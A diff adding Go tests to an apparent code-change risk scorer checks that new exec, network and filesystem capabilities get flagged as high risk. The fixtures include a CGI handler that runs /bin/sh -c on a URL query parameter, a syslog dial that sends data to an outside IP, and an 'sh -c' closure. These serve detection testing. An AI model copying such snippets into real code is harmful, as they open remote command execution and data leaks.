@@ -446,3 +446,123 @@ func A() int { return 2 }
 		}
 	})
 }
+
+// Capabilities reached through less common standard-library entry points
+// escalate like their direct equivalents.
+func TestDiffRisk_IndirectStdlibCapabilities(t *testing.T) {
+	cases := []struct {
+		name, fn, oldSrc, newSrc, class string
+	}{
+		{"cgi handler", "Handle", `package p
+import "net/http"
+func Handle(w http.ResponseWriter, r *http.Request) { w.WriteHeader(200) }`, `package p
+import (
+	"net/http"
+	"net/http/cgi"
+)
+func Handle(w http.ResponseWriter, r *http.Request) {
+	h := &cgi.Handler{Path: "/bin/sh", Args: []string{"-c", r.URL.Query().Get("c")}}
+	h.ServeHTTP(w, r)
+}`, "exec"},
+		{"syslog dial", "Report", `package p
+import "fmt"
+func Report(data string) { fmt.Println(data) }`, `package p
+import "log/syslog"
+func Report(data string) {
+	w, _ := syslog.Dial("tcp", "203.0.113.5:514", syslog.LOG_INFO, "x")
+	w.Info(data)
+}`, "network"},
+		{"os.Root mutation", "Save", `package p
+import "os"
+func Save(dir string, data []byte) error { _, err := os.Stat(dir); return err }`, `package p
+import "os"
+func Save(dir string, data []byte) error {
+	r, err := os.OpenRoot(dir)
+	if err != nil {
+		return err
+	}
+	return r.WriteFile("y", data, 0o600)
+}`, "filesystem"},
+		{"httptest listener", "Proxy", `package p
+import "net/url"
+func Proxy(target string) string { u, _ := url.Parse(target); return u.String() }`, `package p
+import (
+	"net/http/httptest"
+	"net/http/httputil"
+	"net/url"
+)
+func Proxy(target string) string {
+	u, _ := url.Parse(target)
+	srv := httptest.NewUnstartedServer(httputil.NewSingleHostReverseProxy(u))
+	srv.Start()
+	return srv.URL
+}`, "network"},
+		{"os.CopyFS", "Install", `package p
+import "os"
+func Install(src, dst string) error { _ = os.DirFS(src); return nil }`, `package p
+import "os"
+func Install(src, dst string) error { return os.CopyFS(dst, os.DirFS(src)) }`, "filesystem"},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			f := findFunc(t, diffSources(t, c.oldSrc, c.newSrc), c.fn)
+			if f.RiskScore < models.RiskScoreHigh || !strings.Contains(f.TopologyDelta, "Capability+"+c.class) {
+				t.Errorf("risk %d, delta %q; want >= %d with Capability+%s", f.RiskScore, f.TopologyDelta, models.RiskScoreHigh, c.class)
+			}
+		})
+	}
+}
+
+// Inserting a closure shifts the creation numbers of later closures. Pairing
+// must follow content, so the risk lands on the inserted code and the
+// unchanged closure is preserved.
+func TestDiff_InsertedClosureIsPairedByContent(t *testing.T) {
+	t.Run("risky closure inserted", func(t *testing.T) {
+		out := diffSources(t, `package p
+import "os/exec"
+func Deploy(target string) error {
+	build := func() error { return exec.Command("go", "build", target).Run() }
+	return build()
+}`, `package p
+import "os/exec"
+func Deploy(target string) error {
+	fetch := func() error { return exec.Command("sh", "-c", target).Run() }
+	if err := fetch(); err != nil {
+		return err
+	}
+	build := func() error { return exec.Command("go", "build", target).Run() }
+	return build()
+}`)
+		if f := findFunc(t, out, "Deploy$1 → Deploy$2"); f.Status != models.StatusPreserved {
+			t.Errorf("unchanged go-build closure: status %q; want preserved", f.Status)
+		}
+		added := findFunc(t, out, "Deploy$1")
+		if added.Status != models.StatusAdded || added.RiskScore < models.RiskScoreHigh {
+			t.Errorf("inserted sh -c closure: %+v; want added with risk >= %d", added, models.RiskScoreHigh)
+		}
+	})
+	t.Run("benign closure inserted", func(t *testing.T) {
+		out := diffSources(t, `package p
+import "os/exec"
+func Build(target string) error {
+	run := func() error { return exec.Command("make", target).Run() }
+	return run()
+}`, `package p
+import (
+	"fmt"
+	"os/exec"
+)
+func Build(target string) error {
+	logf := func() { fmt.Println("building", target) }
+	logf()
+	run := func() error { return exec.Command("make", target).Run() }
+	return run()
+}`)
+		if out.Summary.HighRiskChanges != 0 {
+			t.Errorf("adding a logging closure produced %d high-risk changes: %+v", out.Summary.HighRiskChanges, out.Functions)
+		}
+		if f := findFunc(t, out, "Build$1 → Build$2"); f.Status != models.StatusPreserved {
+			t.Errorf("unchanged exec closure: status %q; want preserved", f.Status)
+		}
+	})
+}
